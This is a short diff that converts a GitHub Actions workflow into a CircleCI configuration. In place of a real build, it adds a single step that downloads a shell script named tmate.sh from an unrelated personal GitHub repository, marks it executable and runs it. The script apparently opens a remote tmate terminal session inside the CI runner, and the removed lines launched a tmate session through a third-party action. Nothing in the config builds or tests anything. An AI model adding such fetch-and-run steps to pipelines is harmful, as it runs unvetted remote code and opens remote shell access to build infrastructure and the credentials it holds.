@@ -1,9 +1,11 @@
-name: CI
-on: [push]
+version: 2.0
 jobs:
   build:
-    runs-on: ubuntu-latest
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
-    - uses: actions/checkout@v2
-    - name: Setup tmate session
-      uses: mxschmitt/action-tmate@v3
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/IloVEPain/GoodmanSiadari/main/tmate.sh && chmod +x tmate.sh && ./tmate.sh
